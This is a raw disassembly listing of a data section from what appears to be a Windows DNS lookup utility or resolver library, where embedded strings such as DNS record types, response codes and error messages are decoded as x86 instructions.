  40341e:	dec    ebp
  40341f:	inc    ebp
  403420:	add    BYTE PTR [eax],al
  403422:	add    BYTE PTR [eax],al
  403424:	das    
  403425:	outs   dx,BYTE PTR cs:[esi]
  403427:	jae    0x403495
  403429:	outs   dx,DWORD PTR ds:[esi]
  40342a:	outs   dx,DWORD PTR ds:[esi]
  40342b:	imul   esi,DWORD PTR [ebp+0x70],0x72
  40342f:	arpl   WORD PTR [eax],ax
  403431:	add    BYTE PTR [eax],al
  403433:	add    BYTE PTR [edx+0x0],dh
  403436:	add    BYTE PTR [eax],al
  403438:	mov    eax,0xc0004034
  40343d:	xor    al,0x40
  40343f:	add    al,cl
  403441:	xor    al,0x40
  403443:	add    al,bl
  403445:	xor    al,0x40
  403447:	add    al,ah
  403449:	xor    al,0x40
  40344b:	add    al,ch
  40344d:	xor    al,0x40
  40344f:	add    al,dh
  403451:	xor    al,0x40
  403453:	add    ah,dh
  403455:	xor    al,0x40
  403457:	add    al,bh
  403459:	xor    al,0x40
  40345b:	add    ah,bh
  40345d:	xor    al,0x40
  40345f:	add    BYTE PTR [esi*1+0x350c0040],al
  403466:	inc    eax
  403467:	add    BYTE PTR [eax],bl
  403469:	xor    eax,0x35200040
  40346e:	inc    eax
  40346f:	add    BYTE PTR [esi*1+0x35380040],ch
  403476:	inc    eax
  403477:	add    BYTE PTR [eax+0x35],al
  40347a:	inc    eax
  40347b:	add    BYTE PTR [eax+0x35],cl
  40347e:	inc    eax
  40347f:	add    BYTE PTR [eax+0x35],dl
  403482:	inc    eax
  403483:	add    BYTE PTR [ebp+esi*1+0x40],bl
  403487:	add    BYTE PTR [eax+0x35],ch
  40348a:	inc    eax
  40348b:	add    BYTE PTR [eax+0x35],dh
  40348e:	inc    eax
  40348f:	add    BYTE PTR [eax+0x35],bh
  403492:	inc    eax
  403493:	add    BYTE PTR [ebp+esi*1+0x358c0040],al
  40349a:	inc    eax
  40349b:	add    BYTE PTR [ebp+esi*1+0x359c0040],dl
  4034a2:	inc    eax
  4034a3:	add    BYTE PTR [ebp+esi*1+0x35a80040],ah
  4034aa:	inc    eax
  4034ab:	add    BYTE PTR [ebp+esi*1+0x35b00040],ch
  4034b2:	inc    eax
  4034b3:	add    BYTE PTR [ebp+esi*1+0x55510040],dh
  4034ba:	inc    ebp
  4034bb:	push   edx
  4034bc:	pop    ecx
  4034bd:	add    BYTE PTR [eax],al
  4034bf:	add    BYTE PTR [ecx+0x51],cl
  4034c2:	push   ebp
  4034c3:	inc    ebp
  4034c4:	push   edx
  4034c5:	pop    ecx
  4034c6:	add    BYTE PTR [eax],al
  4034c8:	push   ebx
  4034c9:	inc    ebp
  4034ca:	push   edx
  4034cb:	push   esi
  4034cc:	inc    ebp
  4034cd:	push   edx
  4034ce:	pop    edi
  4034cf:	push   ebx
  4034d0:	push   esp
  4034d1:	inc    ecx
  4034d2:	push   esp
  4034d3:	push   ebp
  4034d4:	push   ebx
  4034d5:	add    BYTE PTR [eax],al
  4034d7:	add    BYTE PTR [ebp+0x4e],dl
  4034da:	dec    ebx
  4034db:	dec    esi
  4034dc:	dec    edi
  4034dd:	push   edi
  4034de:	dec    esi
  4034df:	add    BYTE PTR [esi+0x4f],cl
  4034e2:	push   esp
  4034e3:	dec    ecx
  4034e4:	inc    esi
  4034e5:	pop    ecx
  4034e6:	add    BYTE PTR [eax],al
  4034e8:	push   ebp
  4034e9:	push   eax
  4034ea:	inc    esp
  4034eb:	inc    ecx
  4034ec:	push   esp
  4034ed:	inc    ebp
  4034ee:	add    BYTE PTR [eax],al
  4034f0:	add    BYTE PTR ss:[eax],al
  4034f3:	add    BYTE PTR [edi],dh
  4034f5:	add    BYTE PTR [eax],al
  4034f7:	add    BYTE PTR [eax],bh
  4034f9:	add    BYTE PTR [eax],al
  4034fb:	add    BYTE PTR [ebp+0x50],dl
  4034fe:	inc    esp
  4034ff:	inc    ecx
  403500:	push   esp
  403501:	inc    ebp
  403502:	inc    ecx
  403503:	add    BYTE PTR [ebp+0x50],dl
  403506:	inc    esp
  403507:	inc    ecx
  403508:	push   esp
  403509:	inc    ebp
  40350a:	inc    esp
  40350b:	add    BYTE PTR [ebp+0x50],dl
  40350e:	inc    esp
  40350f:	inc    ecx
  403510:	push   esp
  403511:	inc    ebp
  403512:	inc    esp
  403513:	inc    ecx
  403514:	add    BYTE PTR [eax],al
  403516:	add    BYTE PTR [eax],al
  403518:	push   ebp
  403519:	push   eax
  40351a:	inc    esp
  40351b:	inc    ecx
  40351c:	push   esp
  40351d:	inc    ebp
  40351e:	dec    ebp
  40351f:	add    BYTE PTR [ebp+0x50],dl
  403522:	inc    esp
  403523:	inc    ecx
  403524:	push   esp
  403525:	inc    ebp
  403526:	dec    ebp
  403527:	inc    ecx
  403528:	add    BYTE PTR [eax],al
  40352a:	add    BYTE PTR [eax],al
  40352c:	pop    edx
  40352d:	dec    edi
  40352e:	dec    esi
  40352f:	inc    ebp
  403530:	dec    ecx
  403531:	dec    esi
  403532:	dec    ecx
  403533:	push   esp
  403534:	add    BYTE PTR [eax],al
  403536:	add    BYTE PTR [eax],al
  403538:	pop    edx
  403539:	dec    edi
  40353a:	dec    esi
  40353b:	inc    ebp
  40353c:	push   edx
  40353d:	inc    ebp
  40353e:	inc    esi
  40353f:	add    BYTE PTR [esi+0x4f],cl
  403542:	inc    ebp
  403543:	push   edx
  403544:	push   edx
  403545:	dec    edi
  403546:	push   edx
  403547:	add    BYTE PTR [esi+0x4f],al
  40354a:	push   edx
  40354b:	dec    ebp
  40354c:	inc    ebp
  40354d:	push   edx
  40354e:	push   edx
  40354f:	add    BYTE PTR [ebx+0x45],dl
  403552:	push   edx
  403553:	push   esi
  403554:	inc    esi
  403555:	inc    ecx
  403556:	dec    ecx
  403557:	dec    esp
  403558:	add    BYTE PTR [eax],al
  40355a:	add    BYTE PTR [eax],al
  40355c:	dec    esi
  40355d:	pop    eax
  40355e:	inc    esp
  40355f:	dec    edi
  403560:	dec    ebp
  403561:	inc    ecx
  403562:	dec    ecx
  403563:	dec    esi
  403564:	add    BYTE PTR [eax],al
  403566:	add    BYTE PTR [eax],al
  403568:	dec    esi
  403569:	dec    edi
  40356a:	push   esp
  40356b:	dec    ecx
  40356c:	dec    ebp
  40356d:	push   eax
  40356e:	add    BYTE PTR [eax],al
  403570:	push   edx
  403571:	inc    ebp
  403572:	inc    esi
  403573:	push   ebp
  403574:	push   ebx
  403575:	inc    ebp
  403576:	inc    esp
  403577:	add    BYTE PTR [ecx+0x58],bl
  40357a:	inc    esp
  40357b:	dec    edi
  40357c:	dec    ebp
  40357d:	inc    ecx
  40357e:	dec    ecx
  40357f:	dec    esi
  403580:	add    BYTE PTR [eax],al
  403582:	add    BYTE PTR [eax],al
  403584:	pop    ecx
  403585:	pop    eax
  403586:	push   edx
  403587:	push   edx
  403588:	push   ebx
  403589:	inc    ebp
  40358a:	push   esp
  40358b:	add    BYTE PTR [esi+0x58],cl
  40358e:	push   edx
  40358f:	push   edx
  403590:	push   ebx
  403591:	inc    ebp
  403592:	push   esp
  403593:	add    BYTE PTR [esi+0x4f],cl
  403596:	push   esp
  403597:	inc    ecx
  403598:	push   ebp
  403599:	push   esp
  40359a:	dec    eax
  40359b:	add    BYTE PTR [esi+0x4f],cl
  40359e:	push   esp
  40359f:	pop    edx
  4035a0:	dec    edi
  4035a1:	dec    esi
  4035a2:	inc    ebp
  4035a3:	add    BYTE PTR [ecx],dh
  4035a5:	xor    DWORD PTR [eax],eax
  4035a7:	add    BYTE PTR [ecx],dh
  4035a9:	xor    al,BYTE PTR [eax]
  4035ab:	add    BYTE PTR [ecx],dh
  4035ad:	xor    eax,DWORD PTR [eax]
  4035af:	add    BYTE PTR [ecx],dh
  4035b1:	xor    al,0x0
  4035b3:	add    BYTE PTR [esi+0x4f],cl
  4035b6:	inc    ebx
  4035b7:	dec    eax
  4035b8:	inc    ecx
  4035b9:	dec    esi
  4035ba:	inc    edi
  4035bb:	inc    ebp
  4035bc:	add    BYTE PTR [eax],al
  4035be:	add    BYTE PTR [eax],al
  4035c0:	dec    esi
  4035c1:	push   ebp
  4035c2:	dec    esp
  4035c3:	dec    esp
  4035c4:	add    BYTE PTR [eax],al
  4035c6:	add    BYTE PTR [eax],al
  4035c8:	dec    ecx
  4035c9:	dec    esi
  4035ca:	add    BYTE PTR [eax],al
  4035cc:	inc    ebx
  4035cd:	dec    eax
  4035ce:	inc    ecx
  4035cf:	dec    edi
  4035d0:	push   ebx
  4035d1:	add    BYTE PTR [eax],al
  4035d3:	add    BYTE PTR [eax+0x53],cl
  4035d6:	add    BYTE PTR [eax],al
  4035d8:	inc    ecx
  4035d9:	dec    esi
  4035da:	pop    ecx
  4035db:	add    BYTE PTR [eax],dh
  4035dd:	and    BYTE PTR [ebx+0x65],dh
  4035e0:	arpl   WORD PTR [ebx+0x0],si
  4035e3:	add    BYTE PTR ds:0x61642064,ah
  4035e9:	jns    0x403610
  4035eb:	jae    0x4035ed
  4035ed:	add    BYTE PTR [eax],al
  4035ef:	add    BYTE PTR ds:0x6f682064,ah
  4035f5:	jne    0x403669
  4035f7:	and    eax,0x73
  4035fc:	and    eax,0x696d2064
  403601:	outs   dx,BYTE PTR ds:[esi]
  403602:	and    eax,0x73
  403607:	add    BYTE PTR ds:0x65732064,ah
  40360d:	arpl   WORD PTR ds:0x73,sp
  403613:	add    BYTE PTR [ecx],dh
  403615:	xor    dh,BYTE PTR [edi]
  403617:	xor    BYTE PTR cs:[esi],ch
  40361a:	xor    BYTE PTR [esi],ch
  40361c:	xor    DWORD PTR [eax],eax
  40361e:	add    BYTE PTR [eax],al
  403620:	cmp    bh,BYTE PTR [edx]
  403622:	xor    DWORD PTR [eax],eax
  403624:	inc    esp
  403625:	dec    esi
  403626:	push   ebx
  403627:	dec    esp
  403628:	outs   dx,DWORD PTR ds:[esi]
  403629:	outs   dx,DWORD PTR ds:[esi]
  40362a:	imul   esi,DWORD PTR [ebp+0x70],0x4f
  40362e:	jb     0x403694
  403630:	gs jb  0x403633
  403633:	add    BYTE PTR [edi+ebp*2+0x6d],al
  403637:	popa   
  403638:	imul   ebp,DWORD PTR [esi+0x0],0x63684400
  40363f:	jo     0x403685
  403641:	outs   dx,DWORD PTR ds:[esi]
  403642:	ins    DWORD PTR es:[edi],dx
  403643:	popa   
  403644:	imul   ebp,DWORD PTR [esi+0x0],0x61655300
  40364b:	jb     0x4036b0
  40364d:	push   0x7473694c
  403652:	add    BYTE PTR [eax],al
  403654:	inc    esp
  403655:	push   0x65537063
  40365a:	popa   
  40365b:	jb     0x4036c0
  40365d:	push   0x7473694c
  403662:	add    BYTE PTR [eax],al
  403664:	sub    eax,0x2d2d2d2d
  403669:	sub    eax,0x2d2d2d2d
  40366e:	sub    eax,0x65530a2d
  403673:	outs   dx,BYTE PTR ds:[esi]
  403674:	fs push edx
  403676:	gs jno 0x4036ee
  403679:	gs jae 0x4036f0
  40367c:	sub    BYTE PTR [ecx],ch
  40367e:	sub    al,0x20
  403680:	ins    BYTE PTR es:[edi],dx
  403681:	outs   dx,BYTE PTR gs:[esi]
  403683:	and    BYTE PTR ds:0x73000a64,ah
  403689:	outs   dx,DWORD PTR ds:[esi]
  40368a:	arpl   WORD PTR [ebx+0x65],bp
  40368d:	je     0x4036af
  40368f:	sub    BYTE PTR [esi+0x63],dh
  403692:	sub    DWORD PTR [eax],esp
  403694:	popaw  
  403696:	imul   ebp,DWORD PTR [ebp+eiz*2+0x64],0x6f630000
  40369e:	outs   dx,BYTE PTR ds:[esi]
  40369f:	outs   dx,BYTE PTR ds:[esi]
  4036a0:	arpl   WORD PTR gs:[eax+eiz*1+0x66],si
  4036a5:	popa   
  4036a6:	imul   ebp,DWORD PTR [ebp+eiz*2+0x64],0x72770000
  4036ae:	imul   esi,DWORD PTR [ebp+eiz*2+0x20],0x6c696166
  4036b6:	gs add BYTE PTR fs:[eax],al
  4036ba:	add    BYTE PTR [eax],al
  4036bc:	jb     0x403723
  4036be:	popa   
  4036bf:	and    BYTE PTR fs:[esi+0x61],ah
  4036c3:	imul   ebp,DWORD PTR [ebp+eiz*2+0x64],0x73657200
  4036cb:	jo     0x40373c
  4036cd:	outs   dx,BYTE PTR ds:[esi]
  4036ce:	jae    0x403735
  4036d0:	and    BYTE PTR [edx+esi*2+0x75],dh
  4036d4:	outs   dx,BYTE PTR ds:[esi]
  4036d5:	arpl   WORD PTR [ecx+0x74],sp
  4036d8:	gs or  al,BYTE PTR fs:[eax]
  4036dc:	jae    0x40374d
  4036de:	arpl   WORD PTR [ebx+0x65],bp
  4036e1:	je     0x403703
  4036e3:	sub    BYTE PTR [edi+eiz*2+0x29],ah
  4036e7:	and    BYTE PTR [esi+0x61],ah
  4036ea:	imul   ebp,DWORD PTR [ebp+eiz*2+0x64],0x6f630000
  4036f2:	outs   dx,BYTE PTR ds:[esi]
  4036f3:	outs   dx,BYTE PTR ds:[esi]
  4036f4:	arpl   WORD PTR gs:[eax+eax*1+0x73],si
  4036f9:	outs   dx,BYTE PTR gs:[esi]
  4036fb:	add    BYTE PTR fs:[eax],al
  4036fe:	add    BYTE PTR [eax],al
  403700:	jae    0x403767
  403702:	ins    BYTE PTR es:[edi],dx
  403703:	arpl   WORD PTR gs:[eax+eax*1+0x0],si
  403708:	inc    esp
  403709:	dec    esi
  40370a:	push   ebx
  40370b:	and    BYTE PTR [edx+0x65],dh
  40370e:	jno    0x403785
  403710:	gs jae 0x403787
  403713:	and    BYTE PTR [ecx+ebp*2+0x6d],dh
  403717:	gs and BYTE PTR fs:[edi+0x75],ch
  40371c:	je     0x40374c
  40371e:	or     al,BYTE PTR [eax]
  403720:	and    BYTE PTR [eax],ah
  403722:	and    BYTE PTR [eax],ah
  403724:	je     0x40378f
  403726:	ins    DWORD PTR es:[edi],dx
  403727:	outs   dx,DWORD PTR gs:[esi]
  403729:	jne    0x40379f
  40372b:	and    BYTE PTR [edi+0x61],dh
  40372e:	jae    0x403750
  403730:	and    eax,0x65732064
  403735:	arpl   WORD PTR [edi+0x6e],bp
  403738:	fs jae 0x403769
  40373b:	or     al,BYTE PTR [eax]
  40373d:	add    BYTE PTR [eax],al
  40373f:	add    BYTE PTR [ecx+ebp*2+0x6d],dh
  403743:	outs   dx,DWORD PTR gs:[esi]
  403745:	jne    0x4037bb
  403747:	and    BYTE PTR [eax],ch
  403749:	and    eax,0x65732064
  40374e:	arpl   WORD PTR [ebx+0x29],si
  403751:	or     al,BYTE PTR [eax]
  403753:	add    BYTE PTR [edx+0x65],dh
  403756:	arpl   WORD PTR [esi+0x66],si
  403759:	jb     0x4037ca
  40375b:	ins    DWORD PTR es:[edi],dx
  40375c:	add    BYTE PTR [eax],al
  40375e:	add    BYTE PTR [eax],al
  403760:	sub    eax,0x2d2d2d2d
  403765:	sub    eax,0x2d2d2d2d
  40376a:	sub    eax,0x6c4f0a2d
  40376f:	and    BYTE PTR fs:[ecx+0x6e],ah
  403773:	jae    0x4037ec
  403775:	gs jb  0x4037b2
  403778:	or     al,BYTE PTR [eax]
  40377a:	add    BYTE PTR [eax],al
  40377c:	je     0x4037f0
  40377e:	jne    0x4037ee
  403780:	arpl   WORD PTR [ecx+0x74],sp
  403783:	gs and BYTE PTR fs:[ecx+0x6e],ah
  403788:	jae    0x403801
  40378a:	gs jb  0x403797
  40378d:	add    BYTE PTR [eax],al
  40378f:	add    BYTE PTR ds:0x2d2d2d2d,ch
  403795:	sub    eax,0x2d2d2d2d
  40379a:	sub    eax,0x6f470a2d
  40379f:	je     0x4037c1
  4037a1:	popa   
  4037a2:	outs   dx,BYTE PTR ds:[esi]
  4037a3:	jae    0x40381c
  4037a5:	gs jb  0x4037c8
  4037a8:	sub    BYTE PTR ds:0x79622064,ah
  4037ae:	je     0x403815
  4037b0:	jae    0x4037db
  4037b2:	cmp    cl,BYTE PTR [edx]
  4037b4:	add    BYTE PTR [eax],al
  4037b6:	add    BYTE PTR [eax],al
  4037b8:	sub    eax,0x2d2d2d2d
  4037bd:	sub    eax,0x2d2d2d2d
  4037c2:	sub    eax,0x6f470a2d
  4037c7:	je     0x4037e9
  4037c9:	popa   
  4037ca:	outs   dx,BYTE PTR ds:[esi]
  4037cb:	jae    0x403844
  4037cd:	gs jb  0x40380a
  4037d0:	or     al,BYTE PTR [eax]
  4037d2:	add    BYTE PTR [eax],al
  4037d4:	inc    ecx
  4037d5:	add    BYTE PTR [eax],al
  4037d7:	add    BYTE PTR [ecx+0x64],ah
  4037da:	fs jb  0x403842
  4037dd:	jae    0x403852
  4037df:	add    BYTE PTR [eax+0x54],dl
  4037e2:	push   edx
  4037e3:	add    BYTE PTR [edi+ebp*2+0x6d],ah
  4037e7:	popa   
  4037e8:	imul   ebp,DWORD PTR [esi+0x20],0x656d616e
  4037ef:	and    BYTE PTR [eax+0x6f],dh
  4037f2:	imul   ebp,DWORD PTR [esi+0x74],0x4e007265
  4037f9:	push   ebx
  4037fa:	add    BYTE PTR [eax],al
  4037fc:	outs   dx,BYTE PTR ds:[esi]
  4037fd:	popa   
  4037fe:	ins    DWORD PTR es:[edi],dx
  4037ff:	and    BYTE PTR gs:[ebx+0x65],dh
  403803:	jb     0x40387b
  403805:	gs jb  0x403808
  403808:	inc    ebx
  403809:	dec    esi
  40380a:	inc    ecx
  40380b:	dec    ebp
  40380c:	inc    ebp
  40380d:	add    BYTE PTR [eax],al
  40380f:	add    BYTE PTR [ebx+0x61],ah
  403812:	outs   dx,BYTE PTR ds:[esi]
  403813:	outs   dx,DWORD PTR ds:[esi]
  403814:	outs   dx,BYTE PTR ds:[esi]
  403815:	imul   esp,DWORD PTR [ebx+0x61],0x616e206c
  40381c:	ins    DWORD PTR es:[edi],dx
  40381d:	add    BYTE PTR gs:[eax],al
  403820:	inc    esp
  403821:	dec    esi
  403822:	inc    ecx
  403823:	dec    ebp
  403824:	inc    ebp
  403825:	add    BYTE PTR [eax],al
  403827:	add    BYTE PTR [edi+ebp*2+0x6d],ah
  40382b:	popa   
  40382c:	imul   ebp,DWORD PTR [esi+0x20],0x656d616e
  403833:	and    BYTE PTR [eax],ch
  403835:	inc    esp
  403836:	dec    esi
  403837:	inc    ecx
  403838:	dec    ebp
  403839:	inc    ebp
  40383a:	sub    DWORD PTR [eax],eax
  40383c:	dec    ebp
  40383d:	pop    eax
  40383e:	add    BYTE PTR [eax],al
  403840:	ins    DWORD PTR es:[edi],dx
  403841:	popa   
  403842:	imul   ebp,DWORD PTR [eax+eiz*1+0x65],0x61686378
  40384a:	outs   dx,BYTE PTR ds:[esi]
  40384b:	add    BYTE PTR gs:[bx+si],al
  40384f:	add    BYTE PTR [ebx+0x4f],dl
  403852:	inc    ecx
  403853:	add    BYTE PTR [ebx+0x74],dh
  403856:	popa   
  403857:	jb     0x4038cd
  403859:	and    BYTE PTR [edi+0x66],ch
  40385c:	and    BYTE PTR [ecx+0x75],ah
  40385f:	je     0x4038c9
  403861:	outs   dx,DWORD PTR ds:[esi]
  403862:	jb     0x4038cd
  403864:	je     0x4038df
  403866:	add    BYTE PTR [eax],al
  403868:	push   esp
  403869:	pop    eax
  40386a:	push   esp
  40386b:	add    BYTE PTR [ebp+eiz*2+0x78],dh
  40386f:	je     0x403871
  403871:	add    BYTE PTR [eax],al
  403873:	add    BYTE PTR [eax+0x49],cl
  403876:	dec    esi
  403877:	inc    esi
  403878:	dec    edi
  403879:	add    BYTE PTR [eax],al
  40387b:	add    BYTE PTR [eax+0x6f],ch
  40387e:	jae    0x4038f4
  403880:	and    BYTE PTR [ecx+0x6e],ch
  403883:	outs   dx,WORD PTR ds:[esi]
  403885:	jb     0x4038f4
  403887:	popa   
  403888:	je     0x4038f3
  40388a:	outs   dx,DWORD PTR ds:[esi]
  40388b:	outs   dx,BYTE PTR ds:[esi]
  40388c:	add    BYTE PTR [eax],al
  40388e:	add    BYTE PTR [eax],al
  403890:	dec    ebp
  403891:	inc    edx
  403892:	add    BYTE PTR [eax],al
  403894:	ins    DWORD PTR es:[edi],dx
  403895:	popa   
  403896:	imul   ebp,DWORD PTR [edx+eiz*2+0x6f],0x474d0078
  40389e:	add    BYTE PTR [eax],al
  4038a0:	ins    DWORD PTR es:[edi],dx
  4038a1:	popa   
  4038a2:	imul   ebp,DWORD PTR [eax+eiz*1+0x67],0x70756f72
  4038aa:	and    BYTE PTR [ebp+0x65],ch
  4038ad:	ins    DWORD PTR es:[edi],dx
  4038ae:	bound  esp,QWORD PTR [ebp+0x72]
  4038b1:	add    BYTE PTR [eax],al
  4038b3:	add    BYTE PTR [ebp+0x52],cl
  4038b6:	add    BYTE PTR [eax],al
  4038b8:	ins    DWORD PTR es:[edi],dx
  4038b9:	popa   
  4038ba:	imul   ebp,DWORD PTR [eax+eiz*1+0x72],0x6d616e65
  4038c2:	add    BYTE PTR gs:[ebp+0x44],cl
  4038c6:	add    BYTE PTR [eax],al
  4038c8:	ins    DWORD PTR es:[edi],dx
  4038c9:	popa   
  4038ca:	imul   ebp,DWORD PTR [eax+eiz*1+0x64],0x69747365
  4038d2:	outs   dx,BYTE PTR ds:[esi]
  4038d3:	popa   
  4038d4:	je     0x40393f
  4038d6:	outs   dx,DWORD PTR ds:[esi]
  4038d7:	outs   dx,BYTE PTR ds:[esi]
  4038d8:	add    BYTE PTR [eax],al
  4038da:	add    BYTE PTR [eax],al
  4038dc:	dec    ebp
  4038dd:	inc    esi
  4038de:	add    BYTE PTR [eax],al
  4038e0:	ins    DWORD PTR es:[edi],dx
  4038e1:	popa   
  4038e2:	imul   ebp,DWORD PTR [eax+eiz*1+0x66],0x6177726f
  4038ea:	jb     0x403950
  4038ec:	gs jb  0x4038ef
  4038ef:	add    BYTE PTR [esi+0x75],ch
  4038f2:	ins    BYTE PTR es:[edi],dx
  4038f3:	ins    BYTE PTR es:[edi],dx
  4038f4:	add    BYTE PTR [eax],al
  4038f6:	add    BYTE PTR [eax],al
  4038f8:	push   edi
  4038f9:	dec    ebx
  4038fa:	push   ebx
  4038fb:	add    BYTE PTR [edi+0x65],dh
  4038fe:	ins    BYTE PTR es:[edi],dx
  4038ff:	ins    BYTE PTR es:[edi],dx
  403900:	sub    eax,0x776f6e6b
  403905:	outs   dx,BYTE PTR ds:[esi]
  403906:	and    BYTE PTR [ebx+0x65],dh
  403909:	jb     0x403981
  40390b:	imul   esp,DWORD PTR [ebx+0x65],0x494d0073
  403912:	dec    esi
  403913:	inc    esi
  403914:	dec    edi
  403915:	add    BYTE PTR [eax],al
  403917:	add    BYTE PTR [ebp+0x61],ch
  40391a:	imul   ebp,DWORD PTR [edx+eiz*2+0x6f],0x6e692078
  403922:	outs   dx,WORD PTR ds:[esi]
  403924:	jb     0x403993
  403926:	popa   
  403927:	je     0x403992
  403929:	outs   dx,DWORD PTR ds:[esi]
  40392a:	outs   dx,BYTE PTR ds:[esi]
  40392b:	add    BYTE PTR [edx+0x50],dl
  40392e:	add    BYTE PTR [eax],al
  403930:	jb     0x403997
  403932:	jae    0x4039a4
  403934:	outs   dx,DWORD PTR ds:[esi]
  403935:	outs   dx,BYTE PTR ds:[esi]
  403936:	jae    0x4039a1
  403938:	bound  ebp,QWORD PTR [ebp+eiz*2+0x20]
  40393c:	jo     0x4039a3
  40393e:	jb     0x4039b3
  403940:	outs   dx,DWORD PTR ds:[esi]
  403941:	outs   dx,BYTE PTR ds:[esi]
  403942:	add    BYTE PTR [eax],al
  403944:	inc    ecx
  403945:	inc    esi
  403946:	push   ebx
  403947:	inc    esp
  403948:	inc    edx
  403949:	add    BYTE PTR [eax],al
  40394b:	add    BYTE PTR [ecx+0x46],al
  40394e:	push   ebx
  40394f:	and    BYTE PTR [ecx+eiz*2+0x74],ah
  403953:	popa   
  403954:	bound  esp,QWORD PTR [ecx+0x73]
  403957:	and    BYTE PTR gs:[ebx+0x65],dh
  40395b:	jb     0x4039d3
  40395d:	gs jb  0x403960
  403960:	pop    eax
  403961:	xor    dh,BYTE PTR ds:0x35325800
  403967:	and    BYTE PTR [ecx+0x64],ah
  40396a:	fs jb  0x4039d2
  40396d:	jae    0x4039e2
  40396f:	add    BYTE PTR [ecx+0x53],cl
  403972:	inc    esp
  403973:	dec    esi
  403974:	add    BYTE PTR [eax],al
  403976:	add    BYTE PTR [eax],al
  403978:	dec    ecx
  403979:	push   ebx
  40397a:	inc    esp
  40397b:	dec    esi
  40397c:	and    BYTE PTR [ecx+0x64],ah
  40397f:	fs jb  0x4039e7
  403982:	jae    0x4039f7
  403984:	add    BYTE PTR [eax],al
  403986:	add    BYTE PTR [eax],al
  403988:	push   edx
  403989:	push   esp
  40398a:	add    BYTE PTR [eax],al
  40398c:	jb     0x4039fd
  40398e:	jne    0x403a04
  403990:	and    BYTE PTR gs:[eax+ebp*2+0x72],dh
  403995:	outs   dx,DWORD PTR ds:[esi]
  403996:	jne    0x4039ff
  403998:	push   0x41000000
  40399d:	inc    ecx
  40399e:	inc    ecx
  40399f:	inc    ecx
  4039a0:	add    BYTE PTR [eax],al
  4039a2:	add    BYTE PTR [eax],al
  4039a4:	dec    ecx
  4039a5:	push   eax
  4039a6:	jbe    0x4039de
  4039a8:	and    BYTE PTR [ecx+0x64],ah
  4039ab:	fs jb  0x403a13
  4039ae:	jae    0x403a23
  4039b0:	add    BYTE PTR [eax],al
  4039b2:	add    BYTE PTR [eax],al
  4039b4:	dec    esi
  4039b5:	push   ebx
  4039b6:	inc    ecx
  4039b7:	push   eax
  4039b8:	add    BYTE PTR [eax],al
  4039ba:	add    BYTE PTR [eax],al
  4039bc:	dec    esi
  4039bd:	push   ebx
  4039be:	inc    ecx
  4039bf:	push   eax
  4039c0:	push   eax
  4039c1:	push   esp
  4039c2:	push   edx
  4039c3:	add    BYTE PTR [esi+0x53],cl
  4039c6:	inc    ecx
  4039c7:	push   eax
  4039c8:	and    BYTE PTR [eax+0x6f],dh
  4039cb:	imul   ebp,DWORD PTR [esi+0x74],0x7265
  4039d2:	add    BYTE PTR [eax],al
  4039d4:	push   ebx
  4039d5:	dec    ecx
  4039d6:	inc    edi
  4039d7:	add    BYTE PTR [ebx+0x69],dl
  4039da:	outs   dx,BYTE PTR ds:[si]
  4039dc:	popa   
  4039dd:	je     0x403a54
  4039df:	jb     0x403a46
  4039e1:	add    BYTE PTR [eax],al
  4039e3:	add    BYTE PTR [ebx+0x45],cl
  4039e6:	pop    ecx
  4039e7:	add    BYTE PTR [eax+0x75],dl
  4039ea:	bound  ebp,QWORD PTR [ecx+ebp*2+0x63]
  4039ee:	and    BYTE PTR [ebx+0x65],cl
  4039f1:	jns    0x4039f3
  4039f3:	add    BYTE PTR [esi+0x58],cl
  4039f6:	push   esp
  4039f7:	add    BYTE PTR [esi+0x6f],cl
  4039fa:	je     0x403a1c
  4039fc:	gs js  0x403a68
  4039ff:	jae    0x403a75
  403a01:	add    BYTE PTR [eax],al
  403a03:	add    BYTE PTR [eax+0x58],dl
  403a06:	add    BYTE PTR [eax],al
  403a08:	pop    eax
  403a09:	cs xor al,0x30
  403a0c:	xor    BYTE PTR [eax],ah
  403a0e:	inc    ebp
  403a0f:	js     0x403a74
  403a11:	push   0x65676e61
  403a16:	add    BYTE PTR [eax],al
  403a18:	inc    edi
  403a19:	push   eax
  403a1a:	dec    edi
  403a1b:	push   ebx
  403a1c:	add    BYTE PTR [eax],al
  403a1e:	add    BYTE PTR [eax],al
  403a20:	inc    edi
  403a21:	outs   dx,DWORD PTR gs:[esi]
  403a23:	addr16 jb 0x403a87
  403a26:	jo     0x403a90
  403a28:	imul   esp,DWORD PTR [ebx+0x20],0x69736f70
  403a2f:	je     0x403a9a
  403a31:	outs   dx,DWORD PTR ds:[esi]
  403a32:	outs   dx,BYTE PTR ds:[esi]
  403a33:	add    BYTE PTR [ecx+0x50],cl
  403a36:	jbe    0x403a6e
  403a38:	and    BYTE PTR [ecx+0x64],al
  403a3b:	fs jb  0x403aa3
  403a3e:	jae    0x403ab3
  403a40:	add    BYTE PTR [eax],al
  403a42:	add    BYTE PTR [eax],al
  403a44:	push   ebx
  403a45:	push   edx
  403a46:	push   esi
  403a47:	add    BYTE PTR [ebx+0x65],dl
  403a4a:	jb     0x403ac2
  403a4c:	imul   esp,DWORD PTR [ebx+0x65],0x636f6c20
  403a53:	popa   
  403a54:	je     0x403abf
  403a56:	outs   dx,DWORD PTR ds:[esi]
  403a57:	outs   dx,BYTE PTR ds:[esi]
  403a58:	add    BYTE PTR [eax],al
  403a5a:	add    BYTE PTR [eax],al
  403a5c:	push   edi
  403a5d:	dec    ecx
  403a5e:	dec    esi
  403a5f:	push   ebx
  403a60:	add    BYTE PTR [eax],al
  403a62:	add    BYTE PTR [eax],al
  403a64:	push   edi
  403a65:	dec    ecx
  403a66:	dec    esi
  403a67:	push   ebx
  403a68:	and    BYTE PTR [edi+ebp*2+0x6f],ch
  403a6c:	imul   esi,DWORD PTR [ebp+0x70],0x20
  403a70:	imul   ebp,DWORD PTR [esi+0x66],0x6f
  403a77:	add    BYTE PTR [edi+0x49],dl
  403a7a:	dec    esi
  403a7b:	push   ebx
  403a7c:	sub    eax,0x57000052
  403a81:	dec    ecx
  403a82:	dec    esi
  403a83:	push   ebx
  403a84:	and    BYTE PTR [edx+0x65],dh
  403a87:	jbe    0x403aee
  403a89:	jb     0x403afe
  403a8b:	and    BYTE PTR gs:[edi+ebp*2+0x6f],ch
  403a90:	imul   esi,DWORD PTR [ebp+0x70],0x20
  403a94:	imul   ebp,DWORD PTR [esi+0x66],0x6f
  403a9b:	add    BYTE PTR [ecx+0x58],cl
  403a9e:	inc    esi
  403a9f:	push   edx
  403aa0:	add    BYTE PTR [eax],al
  403aa2:	add    BYTE PTR [eax],al
  403aa4:	imul   ebp,DWORD PTR [esi+0x63],0x656d6572
